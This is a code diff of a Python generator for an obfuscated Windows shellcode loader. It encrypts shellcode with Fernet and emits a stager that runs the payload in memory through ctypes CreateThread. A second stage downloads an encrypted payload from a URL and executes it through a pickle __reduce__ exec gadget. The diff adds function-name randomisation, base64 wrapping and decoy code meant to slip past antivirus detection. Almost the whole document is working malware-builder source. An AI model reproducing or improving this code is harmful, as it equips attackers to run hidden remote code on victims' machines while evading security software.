@@ -1,18 +1,17 @@
-# -*- coding: UTF-8 -*-
-import re
+# -*- coding: utf-8 -*-
 
+import base64
+import re,os,time
 from cryptography.fernet import Fernet
 
 shellcode = b""
-
+url=''
 key = Fernet.generate_key()
 fernet = Fernet(key)
 enstr = fernet.encrypt(shellcode)
-
 key2 = Fernet.generate_key()
 fernet2 = Fernet(key2)
-
-a = f'''
+a=f'''
 import ctypes
 from cryptography.fernet import Fernet
 KEY={key}
@@ -39,65 +38,44 @@ handle = ctypes.windll.kernel32.CreateThread(
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
 '''
 
-b = f'''
-import pickle,base64,requests,ctypes
+cccc=f'''
 from cryptography.fernet import Fernet
+import pickle,base64,requests,ctypes
+import random
+url={url}
+a=[]
+class B():
+    def cc(self):
+        for i in range(5):
+            a.append(i)
 
-url=''
-def doit(sectr):
+def O7303771(sectr):
+    global destr
     KEY={key2}
     fernet = Fernet(KEY)
     destr = fernet.decrypt(sectr).decode()
+    aaa(destr)
+
+def aaa(destr):
     class A(object):
         def __reduce__(self):
             return (exec, (destr,))
-
-    ret = pickle.dumps(A())
+        def O6294286(self):
+            exec(bbb)
+    a=A()
+    a.O6294286()
+    ret = pickle.dumps(a)
     ret_base64 = base64.b64encode(ret)
     ret_decode = base64.b64decode(ret_base64)
     pickle.loads(ret_decode)
 
-t2 ="""
-import base64
-
-st= 'wo gan jue wo ma shang jiu yao bei defender gan diao a ba a bachonogchong chongcong!'.encode()
-res= base64.b64encode(st)
-aaa= res.decode()
-res= base64.b64decode(res)
-bbb= res.decode()
+bbb ="""
+for i in range(100):
+    aaa=B()
+    aaa.cc()
    """
 
-t1 ="""
-import random
-
-def partition(test_arr, low, high):
-   i = (low - 1)  
-   pivot = test_arr[high]
-
-   for j in range(low, high):
-       if test_arr[j] <= pivot:
-           i = i + 1
-           test_arr[i], test_arr[j] = test_arr[j], test_arr[i]
-
-   test_arr[i + 1], test_arr[high] = test_arr[high], test_arr[i + 1]
-   return i + 1
-
-
-def quick_sort(test_arr, low, high):
-   if low < high:
-       pi = partition(test_arr, low, high)
-       quick_sort(test_arr, low, pi - 1)
-       quick_sort(test_arr, pi + 1, high)
-
-
-test_arr= []
-for i in range(59999):
-   test_arr.append(random.random())
-n= len(test_arr)
-quick_sort(test_arr,0, n - 1)
-   """
-
-def start():
+def O0135984():
     try:
         r=requests.get(url)
         a = r.status_code
@@ -106,19 +84,15 @@ def start():
         pass
 
     if a == 200:
-        doit(r.text)
+        O7303771(r.text)
     else:
         pass
-
 if __name__ == '__main__':
-    exec(t1)
-    exec(t2)
-    start()
+    O0135984()
 '''
 
-
 def hunxiao():
-    openfile = 'b.py'
+    openfile = 'content.txt'
     text = open(openfile, encoding='utf-8').read()
     wd_df = re.findall("def (.*?)\\(", text)
     wd_df = list(set(wd_df))
@@ -139,7 +113,6 @@ def hunxiao():
             text = text.replace('target=' + wd_df[cs], 'target=' + idlist[cs])
             text = text.replace('global ' + wd_df[cs], 'global ' + idlist[cs])
             text = text.replace(', ' + wd_df[cs], ', ' + idlist[cs])
-        print('successful function:', wd_df, '\n', idlist)
     else:
         print('hash repeat')
 
@@ -147,11 +120,33 @@ def hunxiao():
     file_save.write(text)
     file_save.close()
 
+with open('content.txt', 'bw') as f:
+    f.write(cccc.encode())
+    hunxiao()
 
 with open('a.txt', 'bw') as f:
     f.write(fernet2.encrypt(a.encode()))
 
+with open('content.txt', 'br') as f:
+    content=base64.b64encode(f.read())
+
+b = f'''
+from cryptography.fernet import Fernet
+import pickle,base64,requests,ctypes
+import random
+cccc={content}
+exec(base64.b64decode(cccc).decode())
+'''
+
 with open('b.py', 'w', encoding='utf-8') as f:
     f.write(b)
 
-hunxiao()
+iconame=f'{int (time.time() *1000)}.ico'
+with open('coleak.ico',"br") as f:
+    cont=f.read()
+with open(f'{iconame}',"bw") as f:
+    cont+=iconame.encode()
+    f.write(cont)
+with open('create.py',"br") as f:
+    createit=f.read()
+exec(createit)
